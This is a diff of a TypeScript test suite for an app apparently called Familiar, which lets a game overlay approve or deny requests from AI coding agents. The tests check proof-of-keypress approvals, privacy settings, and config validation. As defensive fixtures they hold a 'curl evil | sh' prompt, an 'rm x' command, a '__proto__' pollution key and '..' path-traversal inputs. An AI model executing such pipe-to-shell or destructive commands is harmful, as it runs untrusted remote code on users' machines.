     } finally {
-      await hub.key("quiet", "off");
+      hub.setQuiet(false);
     }
   });
 
@@ -1794,113 +1802,9 @@ describe("always-on companion and offline honesty", () => {
     expect(buildModel(again, { linked: true, fps: 30 }).attention?.[0].excerpt).toBe("Another correction");
   });
 
-  it("diagnoses catch-up attempts and actual storage outcomes locally without logging content", async () => {
-    const logs: string[] = [];
-    hub.log = line => logs.push(line);
-    const trace = () => logs.filter(line => line.startsWith("[catch-up] ")).map(line => JSON.parse(line.slice(11)));
-    const last = (event: string) => trace().findLast(r => r.event === event);
-    const attention = (id: string) => buildModel(hub, { linked: true, fps: 30 }).attention!.find(a => a.thread === id)!;
-    const ack = (a: any) => hub.action({ type: "caughtUp", thread: a.thread, entry: a.entry, revision: a.revision });
-    const text = "PRIVATE-TRACE-TEXT " + "a".repeat(180);
-    await hub.quick("claude", "@familiar PRIVATE-TRACE-TITLE");
-    const id = hub.view.selected!;
-    claude.emit({ type: "message", threadId: id, itemId: "PRIVATE-TRACE-ENTRY", text });
-    claude.emit({ type: "done", threadId: id, status: "completed" });
-    const original = attention(id);
-    hub.saveNow();
-    ack({ ...original, thread: "PRIVATE-MISSING-THREAD" });
-    expect(last("attempt").result).toBe("missing-thread");
-    await hub.quick("claude", "@familiar PRIVATE-EMPTY-TITLE");
-    const pendingId = hub.view.selected!;
-    ack({ thread: pendingId, entry: "PRIVATE-NO-CANDIDATE", revision: "PRIVATE-NO-REVISION" });
-    expect(last("attempt").result).toBe("no-candidate");
-    claude.emit({ type: "approval", threadId: pendingId, requestId: "PRIVATE-REQUEST", kind: "tool", title: "PRIVATE-APPROVAL-TITLE", detail: "PRIVATE-APPROVAL-BODY", canAlways: false });
-    expect(last("transition")).toMatchObject({ sameText: null, sameNormalizedText: null, sameExcerpt: null, changedFields: null });
-    ack(attention(pendingId));
-    expect(last("attempt").result).toBe("pending");
-    expect(attention(pendingId).pending).toBe(true);
-    ack({ ...original, entry: "PRIVATE-WRONG-ENTRY" });
-    expect(last("attempt").result).toBe("stale-entry");
-    claude.emit({ type: "message", threadId: id, itemId: "PRIVATE-TRACE-ENTRY", text: text + " corrected" });
-    ack(original);
-    expect(last("attempt").result).toBe("stale-revision");
-    expect(attention(id).revision).not.toBe(original.revision);
-    expect(last("transition")).toMatchObject({ source: "message", change: "candidate", sameText: false, changedFields: ["text"] });
-    const corrected = attention(id);
-    ack(corrected);
-    expect(last("attempt").result).toBe("accepted");
-    expect(last("transition")).toMatchObject({ source: "caughtUp", change: "marker", sameText: true });
-    expect(attention(id)).toBeUndefined();
-
-    // Fail the real atomic writer in this test's isolated profile. The old store stays intact.
-    const file = path.join(appData, "Familiar", "threads.json");
-    fs.mkdirSync(file + ".tmp");
-    try {
-      hub.saveNow();
-      expect(last("write")).toMatchObject({ write: "failed", code: "other", receipts: [{ snapshot: "acknowledged" }] });
-      expect(JSON.parse(fs.readFileSync(file, "utf8")).threads.find((t: any) => t.id === id).attentionSeen).not.toBe(corrected.revision);
-    } finally { fs.rmdirSync(file + ".tmp"); }
-    hub.saveNow();
-    expect(last("write")).toMatchObject({ write: "ok", receipts: [{ snapshot: "acknowledged" }] });
-    expect(JSON.parse(fs.readFileSync(file, "utf8")).threads.find((t: any) => t.id === id).attentionSeen).toBe(corrected.revision);
-    const loaded = new Hub(() => cfg, { claude, codex }, line => logs.push(line));
-    (loaded as any).load();
-    const baseline = trace().findLast(r => r.event === "baseline" && r.source === "load" && r.thread === last("attempt").thread);
-    expect(baseline.marker).toBe(baseline.revision);
-    expect(buildModel(loaded, { linked: true, fps: 30 }).attention!.some(a => a.thread === id)).toBe(false);
-
-    ack(corrected); // Already seen is still accepted and uses the existing save schedule.
-    expect(last("attempt").result).toBe("already-seen");
-    const priorAttempt = last("attempt").attempt;
-    claude.emit({ type: "message", threadId: id, itemId: "PRIVATE-TRACE-ENTRY", text: text + " corrected\n  " });
-    expect(last("transition")).toMatchObject({ change: "candidate", sameText: false, sameNormalizedText: true, sameExcerpt: true, changedFields: ["text"] });
-    ack(attention(id));
-    expect(last("superseded")).toMatchObject({ attempt: priorAttempt, by: last("attempt").attempt });
-    hub.saveNow();
-    expect(last("write").receipts).toHaveLength(1);
-    expect(last("write").receipts[0].attempt).toBe(last("attempt").attempt);
-    // Equal text in a genuinely distinct message is new attention; tracing does not deduplicate it.
-    claude.emit({ type: "message", threadId: id, itemId: "PRIVATE-DISTINCT-ENTRY", text: text + " corrected\n  " });
-    expect(last("transition")).toMatchObject({ change: "candidate", sameText: true, sameNormalizedText: true, sameExcerpt: true, changedFields: [] });
-    expect(attention(id)).toBeDefined();
-    ack(attention(id));
-    // A later reply then a send implicitly catches up before the original pending write.
-    claude.emit({ type: "message", threadId: id, itemId: "PRIVATE-IMPLICIT-ENTRY", text: "PRIVATE-IMPLICIT-REPLY" });
-    const implicit = attention(id);
-    hub.action({ type: "select", id });
-    await hub.prompt("PRIVATE-NEXT-INPUT");
-    expect(last("write")).toMatchObject({ write: "ok", receipts: [{ snapshot: "changed" }] });
-    expect(last("write").receipts[0].written).not.toBe(last("write").receipts[0].acknowledged);
-    expect(JSON.parse(fs.readFileSync(file, "utf8")).threads.find((t: any) => t.id === id).attentionSeen).toBe(implicit.revision);
-    claude.emit({ type: "done", threadId: id, status: "completed" });
-    claude.emit({ type: "message", threadId: id, itemId: "PRIVATE-OMITTED-ENTRY", text: "PRIVATE-OMITTED-REPLY" });
-    ack(attention(id));
-    hub.action({ type: "archive", id });
-    await tick();
-    hub.saveNow();
-    expect(last("write")).toMatchObject({ write: "ok", receipts: [{ snapshot: "omitted", written: null }] });
-
-    const count = trace().length;
-    for (let i = 0; i < 3; i++) hub.handleAddon({ t: "hello", char: "PRIVATE-CHAR", realm: "PRIVATE-REALM" });
-    await hub.key("font", "100");
-    expect(trace()).toHaveLength(count); // No unchanged hello/config/status noise.
-    for (let i = 0; i < 34; i++) {
-      const t = { ...hub.threads.get(pendingId)!, id: `PRIVATE-LIMIT-${i}`, status: "idle" as const,
-        entries: [{ id: `PRIVATE-LIMIT-ENTRY-${i}`, kind: "assistant" as const, text, at: Date.now() }], attentionSeen: null };
-      hub.threads.set(t.id, t); ack(attention(t.id));
-    }
-    expect((hub as any).catchUpTrace.size).toBe(32);
-    expect((hub as any).catchUpWrites.size).toBe(32);
-    expect(trace().filter(r => r.event === "coverage-limit").map(r => r.scope).sort()).toEqual(["monitor", "write"]);
-    hub.saveNow();
-    expect(last("write").receipts).toHaveLength(32);
-    const rawAction = { type: "caughtUp", thread: id, entry: original.entry, revision: original.revision };
-    const line = describeOverlayAction(rawAction);
+  it("a Caught up click is logged without its thread, entry or revision", () => {
+    const line = describeOverlayAction({ type: "caughtUp", thread: "PRIVATE-thread", entry: "PRIVATE-entry", revision: "PRIVATE-revision" });
     expect(line).toBe('[overlay] action {"type":"caughtUp"}');
-    expect(describeOverlayAction({ type: "quiet", on: true })).toBe('[overlay] action {"type":"quiet","on":true}');
-    const diagnosticOnly = JSON.stringify(trace()) + line;
-    for (const privateValue of ["PRIVATE-", id, original.entry, original.revision, text, projRoot,
-      createHash("sha256").update(text).digest("hex")]) expect(diagnosticOnly).not.toContain(privateValue);
   });
 
   it("replying to a quest or stopping it counts as caught up; a new reply raises a new note", async () => {
@@ -1930,36 +1834,63 @@ describe("always-on companion and offline honesty", () => {
     expect(t.entries.find(e => e.requestId === "q1")?.approval).toBe("approved");
   });
 
-  it("/fam autostart toggles launch-at-login through the config hook", async () => {
-    let saved: any;
-    hub.onConfigChanged = (c) => (saved = { ...c });
-    const before = cfg.launchAtLogin;
-    await hub.key("autostart", "on");
-    expect(saved.launchAtLogin).toBe(true);
-    await hub.key("autostart", "off");
-    expect(saved.launchAtLogin).toBe(false);
-    await hub.key("autostart", "");
-    expect(saved.launchAtLogin).toBe(true);
-    cfg.launchAtLogin = before;
+  it("settings(): the panel's one write path checks and clamps each value, then saves once", () => {
+    const before = { ...cfg };
+    const saves: any[] = [];
+    hub.onConfigChanged = (c) => saves.push({ ...c });
+    try {
+      expect(hub.settings({ fontScale: 5, soundVolume: 140, raidWarnings: false, trayNotices: false, launchAtLogin: true,
+        approveByClick: true, inheritAgentConfig: true, defaultMode: "plan", approveKey: "ctrl-f9" })).toEqual([]);
+      expect(saves).toHaveLength(1);
+      expect(cfg).toMatchObject({ fontScale: 1.6, soundVolume: 100, raidWarnings: false, trayNotices: false, launchAtLogin: true,
+        approveByClick: true, inheritAgentConfig: true, defaultMode: "plan", approveKey: "CTRL-F9" });
+      expect(buildModel(hub, { linked: true, fps: 30 })).toMatchObject({ fontScale: 1.6, raidWarnings: false });
+      // FamiliarSync carries the text size: the addon sizes its quest-list rows by it at the next login / reload.
+      expect(buildSnapshot(hub)).toContain("\n  fontScale = 1.6,\n");
+      expect(hub.toasts).toEqual([]); // the panel shows its own confirmation
+      // Wrong types and unknown values change nothing; a key Familiar can't check clears the binding.
+      hub.settings({ fontScale: NaN, soundVolume: "loud" as any, sound: "false" as any, approveByClick: "false" as any,
+        defaultMode: "bypassPermissions", approveKey: "MOUSEWHEELUP" });
+      expect(cfg).toMatchObject({ fontScale: 1.6, soundVolume: 100, sound: before.sound, approveByClick: true, defaultMode: "plan", approveKey: "" });
+      saves.length = 0;
+      hub.settings({ raidWarnings: false, launchAtLogin: true });
+      expect(saves).toEqual([]); // nothing changed, nothing saved
+      // Privacy is one level of three; each move is one write and one line on the Glass.
+      const level = () => [cfg.privateMode, cfg.blurTranscript];
+      for (const [privacy, want, said] of [["blur", [true, true], /^Stream-safe on/], ["names", [true, false], /^Replies no longer blurred/],
+        ["off", [false, false], /^Hide names off/], ["names", [true, false], /^Hide names on/], ["sideways", [true, false], /^Hide names on/]] as const) {
+        hub.settings({ privacy: privacy as any });
+        expect(level()).toEqual(want);
+        expect(hub.toasts.at(-1)!.text).toMatch(said);
+      }
+      expect(hub.settings({ privacy: "off" }, "game")).toEqual(["privacy"]);
+      expect(level()).toEqual([true, false]);
+    } finally {
+      Object.assign(cfg, before);
+    }
   });
 
-  it("/fam font, sound and warnings change the config and reach the overlay model", async () => {
-    const { buildModel } = await import("../src/hub/viewmodel");
-    const before = { fontScale: cfg.fontScale, sound: cfg.sound, raidWarnings: cfg.raidWarnings };
-    hub.onConfigChanged = () => {};
-    await hub.key("font", "bigger");
-    await hub.key("font", "bigger");
-    expect(cfg.fontScale).toBe(1.2);
-    await hub.key("font", "500");
-    expect(cfg.fontScale).toBe(1.6); // capped
-    await hub.key("sound", "off");
-    expect(cfg.sound).toBe(false);
-    await hub.key("warnings", "");
-    expect(cfg.raidWarnings).toBe(false);
-    expect(buildModel(hub, { linked: true, fps: 30 })).toMatchObject({ fontScale: 1.6, raidWarnings: false });
-    // FamiliarSync carries it too: the addon sizes its quest-list rows by it at the next login / reload.
-    expect(buildSnapshot(hub)).toContain("\n  fontScale = 1.6,\n");
-    Object.assign(cfg, before);
+  it("settings() from the game: Sounds, and Hide names and Stream-safe only towards on", () => {
+    const before = { ...cfg };
+    let saved: any;
+    hub.onConfigChanged = (c) => (saved = { ...c });
+    try {
+      cfg.launchAtLogin = false;
+      const pcOnly = { approveByClick: true, inheritAgentConfig: true, fontScale: 1.2, defaultMode: "auto", approveKey: "F9", raidWarnings: false, trayNotices: false, quiet: true, launchAtLogin: true };
+      expect(hub.settings(pcOnly, "game")).toEqual(Object.keys(pcOnly));
+      expect(saved).toBeUndefined();
+      expect(cfg).toMatchObject({ approveByClick: false, inheritAgentConfig: false, fontScale: before.fontScale, defaultMode: before.defaultMode, raidWarnings: before.raidWarnings, launchAtLogin: false });
+      expect(hub.toasts.at(-1)!.text).toBe("That setting is changed in Familiar on your PC.");
+      for (const [off, name] of [[{ privateMode: false }, "Hide names"], [{ streamSafe: false }, "Stream-safe"]] as const) {
+        expect(hub.settings(off, "game")).toEqual(Object.keys(off));
+        expect(hub.toasts.at(-1)!.text).toBe(`${name} is turned off in Familiar on your PC, not from the game.`);
+      }
+      expect(saved).toBeUndefined();
+      expect(hub.settings({ launchAtLogin: true })).toEqual([]); // the control panel
+      expect(saved.launchAtLogin).toBe(true);
+    } finally {
+      Object.assign(cfg, before);
+    }
   });
 
   it("/fam sound 0-100 sets the volume the Glass plays cues at; on | off | toggle still switch Sounds", async () => {
@@ -2000,17 +1931,6 @@ describe("always-on companion and offline honesty", () => {
     } finally {
       Object.assign(cfg, before);
     }
-  });
-
-  it("font size arguments", async () => {
-    const { setFontScale } = await import("../src/hub/hub");
-    expect(setFontScale(1, "smaller")).toBe(0.9);
-    expect(setFontScale(0.8, "-")).toBe(0.8);
-    expect(setFontScale(1.3, "reset")).toBe(1);
-    expect(setFontScale(1, "130%")).toBe(1.3);
-    expect(setFontScale(1, "1.4")).toBe(1.4);
-    expect(setFontScale(1, "huge")).toBeUndefined();
-    expect(setFontScale(1, "")).toBeUndefined();
   });
 
   it("start() leaves agent backends asleep until wake()", async () => {
@@ -2293,6 +2213,25 @@ describe("config.json", () => {
     fs.writeFileSync(file, JSON.stringify({ sound: false }), "utf8");
     expect(loadConfig(() => {})).toMatchObject({ sound: false, soundVolume: 70 });
   });
+
+  it("missing keys take the defaults, unknown keys are kept, a value of the wrong type is the default and said", () => {
+    const file = path.join(appData, "Familiar", "config.json");
+    fs.mkdirSync(path.dirname(file), { recursive: true });
+    const logged: string[] = [];
+    fs.writeFileSync(file, '{ "fromNewerVersion": { "x": 1 }, "speak": true, "autostartOffered": true, "sound": false, ' +
+      '"approveByClick": "false", "inheritAgentConfig": 1, "exclude": "\\\\secret", "projects": ["C:\\\\work", 7], ' +
+      '"approveKey": 9, "providers": { "gemini": { "command": "gemini" } }, "__proto__": { "approveByClick": true } }', "utf8");
+    const c = loadConfig((line) => logged.push(line));
+    expect(c).toMatchObject({ sound: false, approveByClick: false, inheritAgentConfig: false, projects: [], exclude: DEFAULT_CONFIG.exclude,
+      providers: { gemini: { command: "gemini" } }, defaultMode: "ask", fontScale: 1 });
+    expect((c as any).fromNewerVersion).toEqual({ x: 1 });
+    expect(c.approveKey).toBeUndefined();
+    expect("speak" in c || "autostartOffered" in c).toBe(false); // retired: gone at the next save
+    expect(Object.getPrototypeOf(c)).toBe(Object.prototype);
+    expect(logged.join("\n")).toMatch(/ignored approveByClick \(string, expected boolean\)/);
+    expect(logged.join("\n")).toMatch(/ignored projects \(mixed list, expected list\)/);
+    expect(JSON.parse(fs.readFileSync(file, "utf8")).approveByClick).toBe("false"); // read, never rewritten by loading
+  });
 });
 
 describe("Codex-only players", () => {
@@ -2330,6 +2269,9 @@ describe("Codex-only players", () => {
 });
 
 describe("physical corroboration (any addon can forge strip messages)", () => {
+  // A key press is the proof these tests stand in for: an Approve key is registered.
+  beforeEach(() => void (cfg.approveKey = "F9"));
+  afterEach(() => void delete cfg.approveKey);
   const ask = async (agent: FakeBackend, requestId: string) => {
     await hub.quick(agent === claude ? "claude" : "codex", "@familiar corroborate");
     const id = hub.view.selected!;
@@ -2337,17 +2279,25 @@ describe("physical corroboration (any addon can forge strip messages)", () => {
     return id;
   };
 
-  it("approve and always need proof; deny never does", async () => {
-    await ask(codex, "r1");
-    for (const k of ["approve", "always"]) {
-      hub.handleAddon({ t: "key", k, src: "button", view: "full" });
+  it("approve needs proof for exactly that request; always is refused whatever the proof; deny never needs any", async () => {
+    const id = await ask(codex, "r1");
+    const allow = (requestId: string) => actKey({ type: "decide", thread: id, requestId, decision: "allow" });
+    // No proof; a bare "ok" that names nothing; a real key press for some other request or quest.
+    for (const proof of [undefined, { ok: true, how: "bind" as const }, { ok: true, how: "bind" as const, for: [allow("r0"), actKey({ type: "decide", thread: "q-other", requestId: "r1", decision: "allow" })] }]) {
+      hub.handleAddon({ t: "key", k: "approve", src: "button", view: "full" }, proof);
       await tick();
       expect(codex.decisions).toEqual([]);
-      expect(hub.toasts.at(-1)!.text).toMatch(/Click the request on the Glass/);
+      expect(hub.toasts.at(-1)!.text).toMatch(/press your Approve key/);
     }
-    hub.handleAddon({ t: "key", k: "always", src: "bind", view: "full" }, OK);
+    for (const proof of [OK, { ok: true, how: "bind" as const, for: [allow("r1")] }]) {
+      hub.handleAddon({ t: "key", k: "always", src: "bind", view: "full" }, proof);
+      await tick();
+      expect(codex.decisions).toEqual([]);
+      expect(hub.toasts.at(-1)!.text).toMatch(/press your Approve key/); // no "always" key any more: nothing happens
+    }
+    hub.handleAddon({ t: "key", k: "approve", src: "bind", view: "full" }, { ok: true, how: "bind", for: [allow("r1")] });
     await tick();
-    expect(codex.decisions).toEqual([{ requestId: "r1", d: "allowAlways" }]);
+    expect(codex.decisions).toEqual([{ requestId: "r1", d: "allow" }]);
     (hub as any).lastDecisionAt = 0;
     codex.emit({ type: "approval", threadId: hub.view.selected!, requestId: "r2", kind: "command", title: "Again?", detail: "rm x", canAlways: true });
     hub.handleAddon({ t: "key", k: "deny", src: "slash", view: "full" });
@@ -2357,10 +2307,30 @@ describe("physical corroboration (any addon can forge strip messages)", () => {
 
   it("card actions that grant something need proof; Deny on the card does not", async () => {
     const id = await ask(claude, "c1");
-    hub.action({ type: "decide", thread: id, requestId: "c1", decision: "allow" });
-    hub.action({ type: "decide", thread: id, requestId: "c1", decision: "allow" }, NO_PROOF);
+    const allow = { type: "decide", thread: id, requestId: "c1", decision: "allow" };
+    const click = (a: object) => ({ ok: true, how: "click" as const, for: [actKey(a)] });
+    // Click approval is off by default: even a real click on the Glass's own Approve button is refused.
+    hub.action(allow, click(allow));
     expect(claude.decisions).toEqual([]);
-    expect(hub.toasts.at(-1)!.text).toMatch(/could not be matched to your mouse/);
+    expect(hub.toasts.at(-1)!.text).toMatch(/Press your Approve key to approve/);
+    cfg.approveByClick = true;
+    try {
+      // No proof; a bare "ok"; a real click on another request's button.
+      for (const proof of [undefined, NO_PROOF, { ok: true, how: "click" as const }, click({ ...allow, requestId: "c0" })]) {
+        hub.action(allow, proof);
+        expect(claude.decisions).toEqual([]);
+        expect(hub.toasts.at(-1)!.text).toMatch(/could not be matched to your mouse/);
+      }
+      hub.action({ ...allow, decision: "allowAlways" }, click({ ...allow, decision: "allowAlways" }));
+      expect(claude.decisions).toEqual([]);
+      expect(hub.toasts.at(-1)!.text).toMatch(/Always can't be given from the game/);
+      hub.action(allow, click(allow));
+      expect(claude.decisions).toEqual([{ requestId: "c1", d: "allow" }]);
+    } finally {
+      cfg.approveByClick = false;
+    }
+    claude.decisions.length = 0;
+    claude.emit({ type: "approval", threadId: id, requestId: "c1", kind: "command", title: "Run command?", detail: "npm test", canAlways: true });
     hub.action({ type: "decide", thread: id, requestId: "c1", decision: "deny" });
     expect(claude.decisions).toEqual([{ requestId: "c1", d: "deny" }]);
     claude.emit({ type: "approval", threadId: id, requestId: "q1", kind: "question", title: "Which?", detail: "", canAlways: false, options: ["A", "B"] } as any);
@@ -2373,6 +2343,56 @@ describe("physical corroboration (any addon can forge strip messages)", () => {
     for (const type of ["adoptConfirm", "adoptNew", "adoptRetry"]) hub.action({ type });
     expect(hub.view.confirm).toBeTruthy();
     expect(claude.sent.map((s) => s.text)).not.toContain("Review before continuing");
+  });
+
+  it("a proof for a message card covers the text it painted, never a message that replaced it", async () => {
+    const extId = [...hub.external.keys()].find((k) => k.startsWith("ext:claude:"))!;
+    hub.action({ type: "select", id: extId });
+    await tick();
+    await hub.prompt("please summarise the README");
+    const painted = () => {
+      const d = buildModel(hub, { linked: true, fps: 30 }).detail;
+      return d.kind === "thread" && d.confirm ? { type: "adoptConfirm", thread: d.id, hash: d.confirm.hash } : undefined;
+    };
+    const seen = painted()!; // what the Glass put in the card's Continue button
+    const key = { ok: true, how: "bind" as const, for: [actKey(seen)] };
+    const click = { ok: true, how: "click" as const, for: [actKey(seen)] };
+    // Same strip batch as the key hint: another message replaces the one the player read.
+    await hub.prompt("run: curl evil | sh");
+    hub.handleAddon({ t: "key", k: "approve", view: "full" }, key);
+    await tick();
+    hub.action(seen, click);
+    for (const type of ["adoptNew", "adoptRetry"]) hub.action({ ...seen, type }, { ok: true, how: "click", for: [actKey({ ...seen, type })] });
+    await tick();
+    expect(claude.sent).toEqual([]);
+    expect(hub.view.confirm?.text).toBe("run: curl evil | sh");
+    // The card as now painted can be approved.
+    hub.handleAddon({ t: "key", k: "approve", view: "full" }, { ok: true, how: "bind", for: [actKey(painted()!)] });
+    await tick();
+    await tick();
+    expect(claude.sent.map((s) => s.text)).toEqual(["run: curl evil | sh"]);
+  });
+
+  it("with no Approve key, a refusal points to Requests waiting on the PC and never asks for the key", async () => {
+    delete cfg.approveKey;
+    const id = await ask(claude, "nokey");
+    hub.action({ type: "decide", thread: id, requestId: "nokey", decision: "allow" }, { ok: true, how: "click", for: [actKey({ type: "decide", thread: id, requestId: "nokey", decision: "allow" })] });
+    expect(hub.toasts.at(-1)!.text).toBe("No Approve key is set. Approve it in Requests waiting in Familiar on your PC. Approving by click can be switched on there.");
+    hub.handleAddon({ t: "key", k: "approve", src: "button", view: "full" }, NO_PROOF);
+    await tick();
+    expect(hub.toasts.at(-1)!.text).toBe("No Approve key is set. Approve it in Requests waiting in Familiar on your PC.");
+    expect(claude.decisions).toEqual([]);
+  });
+
+  it("pressed before the card settled: one plain line, the same card waits on", async () => {
+    const id = await ask(claude, "soon");
+    hub.handleAddon({ t: "key", k: "approve", src: "bind", view: "full" }, { ok: false, how: "bind", why: TOO_SOON });
+    await tick();
+    expect(hub.toasts.at(-1)!.text).toBe("One moment - press your Approve key again.");
+    const d = buildModel(hub, { linked: true, fps: 30 }).detail;
+    expect(d.kind === "thread" && d.entries.find((e) => e.requestId === "soon")?.refused).toBe("One moment - press your Approve key again.");
+    expect(claude.decisions).toEqual([]);
+    expect(hub.threads.get(id)!.status).toBe("approval");
   });
 
   it("one decision per request id, even with two proofs", async () => {
@@ -2393,7 +2413,7 @@ describe("physical corroboration (any addon can forge strip messages)", () => {
       const id = await ask(claude, "fresh");
       hub.action({ type: "decide", thread: id, requestId: "fresh", decision: "allow" }, OK);
       expect(claude.decisions).toEqual([]);
-      expect(hub.toasts.at(-1)!.text).toMatch(/just appeared/);
+      expect(hub.toasts.at(-1)!.text).toBe("One moment - press your Approve key again.");
       vi.advanceTimersByTime(450);
       hub.action({ type: "decide", thread: id, requestId: "fresh", decision: "allow" }, OK);
       expect(claude.decisions).toEqual([{ requestId: "fresh", d: "allow" }]);
@@ -2415,15 +2435,15 @@ describe("physical corroboration (any addon can forge strip messages)", () => {
     hub.onCutRequest = () => alerts++;
     cut("long");
     // The toast says where to approve it, and main is asked to make the control panel easy to reach.
-    expect(hub.toasts.at(-1)).toMatchObject({ kind: "approval", text: "Needs approval · Claude · familiar · Allow Bash? · Open Familiar on your PC to approve",
-      generic: "Needs approval · Claude · Open Familiar on your PC to approve" });
+    expect(hub.toasts.at(-1)).toMatchObject({ kind: "approval", text: "Needs you · Claude · familiar · Allow Bash? · Open Familiar on your PC to approve",
+      generic: "Needs you · Claude · Open Familiar on your PC to approve" });
     expect(alerts).toBe(1);
     hub.action({ type: "decide", thread: id, requestId: "long", decision: "allow" }, NO_PROOF);
     expect(hub.threads.get(id)!.entries.find((e) => e.requestId === "long")!.refused?.why).toBe("cut"); // not "click again"
-    hub.action({ type: "decide", thread: id, requestId: "long", decision: "allow" }, OK);
     hub.action({ type: "decide", thread: id, requestId: "long", decision: "allowAlways" }, OK);
-    await hub.key("approve", undefined, "full", OK);
     await hub.key("always", undefined, "focus", OK);
+    hub.action({ type: "decide", thread: id, requestId: "long", decision: "allow" }, OK);
+    await hub.key("approve", undefined, "full", OK);
     expect(claude.decisions).toEqual([]);
     expect(hub.toasts.at(-1)!.text).toBe("Open it in full on your PC to approve.");
     const detail = buildModel(hub, { linked: true, fps: 30 }).detail;
@@ -2432,7 +2452,7 @@ describe("physical corroboration (any addon can forge strip messages)", () => {
       refused: "Part of this request is hidden here. Approve it in full from Familiar's control panel on your PC, or Deny." });
     expect(JSON.stringify(detail)).not.toContain(full); // the Glass never gets the whole text
     // "Requests waiting": the whole request with real names; a panel click decides it.
-    expect(hub.pendingRequests()).toEqual([{ thread: id, questTitle: "long command", project: "familiar", agent: "Claude", requestId: "long",
+    expect(hub.pendingRequests()).toEqual([{ thread: id, questTitle: "long command", project: "familiar", agent: "Claude", agentId: "claude", requestId: "long",
       title: "Allow Bash?", detail: full.slice(0, 4000) + "\n… (1005 characters omitted from this preview)", full, cut: true, canAlways: true, at: expect.any(Number) }]);
     expect(hub.decide(id, "long", "allow", "panel")).toEqual({ ok: true });
     expect(claude.decisions).toEqual([{ requestId: "long", d: "allow" }]);
@@ -2465,7 +2485,7 @@ describe("physical corroboration (any addon can forge strip messages)", () => {
     let raised: { kind: string; requestId?: string; threadId?: string }[] = [];
     hub.onToast = (x) => raised.push(x);
     // Listed whole (detail is the whole text: nothing is cut), with real names and no badge.
-    expect(hub.pendingRequests()).toEqual([{ thread: id, questTitle: "corroborate", project: "familiar", agent: "Codex", requestId: "short",
+    expect(hub.pendingRequests()).toEqual([{ thread: id, questTitle: "corroborate", project: "familiar", agent: "Codex", agentId: "codex", requestId: "short",
       title: "Run command?", detail: "npm test", cut: false, canAlways: true, at: expect.any(Number) }]);
     expect(hub.decide(id, "short", "allow", "panel")).toEqual({ ok: true });
     expect(codex.decisions).toEqual([{ requestId: "short", d: "allow" }]);
@@ -2509,7 +2529,7 @@ describe("physical corroboration (any addon can forge strip messages)", () => {
       };
       hub.action({ type: "decide", thread: id, requestId: "r1", decision: "allow" }, NO_PROOF);
       expect(card().refused?.why).toBe("proof");
-      expect(line()).toBe("That click wasn't confirmed as yours. Click Approve again.");
+      expect(line()).toBe("Not confirmed as yours. With this request on screen, press your Approve key again.");
       hub.handleAddon({ t: "key", k: "approve", src: "bind", view: "full" }); // no matching key press
       await tick();
       expect(card().refused?.why).toBe("proof");
@@ -2518,7 +2538,7 @@ describe("physical corroboration (any addon can forge strip messages)", () => {
       expect(line()).toBe("Use Full view and review the request before deciding.");
       hub.minCardAgeMs = 400;
       hub.action({ type: "decide", thread: id, requestId: "r1", decision: "allow" }, OK);
-      expect(line()).toBe("This request just appeared. Read it, then click again.");
+      expect(line()).toBe("One moment - press your Approve key again.");
       expect(claude.decisions).toEqual([]);
       vi.advanceTimersByTime(450);
       hub.action({ type: "decide", thread: id, requestId: "r1", decision: "allow" }, OK);
@@ -2536,17 +2556,50 @@ describe("physical corroboration (any addon can forge strip messages)", () => {
     }
   });
 
-  it("Mode needs a click on the Mode button", async () => {
+  it("Mode is never changed from the game, with or without proof", async () => {
     await hub.quick("claude", "@familiar mode");
     const t = hub.selectedThread()!;
-    hub.handleAddon({ t: "key", k: "mode", src: "button", view: "full" });
-    await tick();
-    expect(t.mode).toBe("ask");
-    expect(claude.modes).toEqual([]);
-    expect(hub.toasts.at(-1)!.text).toMatch(/Mode changes need a click/);
-    hub.handleAddon({ t: "key", k: "mode", src: "button", view: "full" }, OK);
-    await tick();
-    expect(t.mode).toBe("plan");
+    for (const proof of [undefined, OK]) {
+      hub.handleAddon({ t: "key", k: "mode", src: "button", view: "full" }, proof);
+      await tick();
+      expect(t.mode).toBe("ask");
+      expect(claude.modes).toEqual([]);
+      expect(hub.toasts.at(-1)!.text).toBe("Modes are changed in Familiar on your PC, not from the game.");
+    }
+  });
+
+  it("a folder typed in the game must be inside a folder added on the PC or a known zone", async () => {
+    const outside = fs.mkdtempSync(path.join(tmp, "elsewhere-"));
+    const refused = /isn't one of your project folders.*Familiar on your PC/;
+    for (const typed of [outside, `mkdir ${path.join(outside, "made-from-the-game")}`, `mkdir ${path.join(projRoot, "..", path.basename(outside), "dotdot")}`]) {
+      await hub.key("newClaude");
+      await hub.prompt(typed);
+      expect(hub.view.draft).toBeUndefined();
+      expect(hub.toasts.at(-1)!.text).toMatch(refused);
+    }
+    expect(fs.readdirSync(outside)).toEqual([]); // nothing was created outside
+    expect(hub.projects.byPath(outside)).toBeUndefined();
+    // Inside a configured folder of projects, and inside a zone Familiar already lists: allowed.
+    await hub.key("newClaude");
+    await hub.prompt(`mkdir ${path.join(projRoot, "typed-new")}`);
+    expect(hub.view.draft?.cwd).toBe(fs.realpathSync.native(path.join(projRoot, "typed-new")));
+    fs.mkdirSync(path.join(projRoot, "alpha", "packages", "one"), { recursive: true });
+    await hub.key("newClaude");
+    await hub.prompt(path.join(projRoot, "alpha", "packages", "one"));
+    expect(hub.view.draft?.cwd).toBe(fs.realpathSync.native(path.join(projRoot, "alpha", "packages", "one")));
+  });
+
+  it("quests open without the player's agent configuration unless inheritAgentConfig is switched on", async () => {
+    expect(DEFAULT_CONFIG).toMatchObject({ inheritAgentConfig: false, approveByClick: false });
+    await hub.quick("claude", "@familiar isolated");
+    expect(claude.open_.get(hub.view.selected!)!.inheritConfig).toBe(false);
+    cfg.inheritAgentConfig = true;
+    try {
+      await hub.quick("claude", "@familiar inherits");
+      expect(claude.open_.get(hub.view.selected!)!.inheritConfig).toBe(true);
+    } finally {
+      cfg.inheritAgentConfig = false;
+    }
   });
 });
 
@@ -2573,7 +2626,7 @@ describe("A Familiar Face (the tutorial quest)", () => {
     expect(m.list.rows.find((r) => r.key === t.id)).toMatchObject({ agent: "familiar", unread: true, text: "A Familiar Face" });
     expect(m.providers.familiar).toEqual({ label: "Familiar", glyph: "◆" });
     expect(h.projects.list().some((p) => p.path === t.cwd)).toBe(false); // never offered as a zone
-    expect(buildSnapshot(h)).toContain("[Familiar] A Familiar Face");
+    expect(buildSnapshot(h)).not.toContain("A Familiar Face"); // FamiliarSync holds no titles (owner decision 4)
 
     h.action({ type: "select", id: t.id });
     await h.prompt("hi");
@@ -2581,7 +2634,7 @@ describe("A Familiar Face (the tutorial quest)", () => {
     expect(card).toMatchObject({ approval: "pending", title: "Practice: light the hearth", canAlways: false });
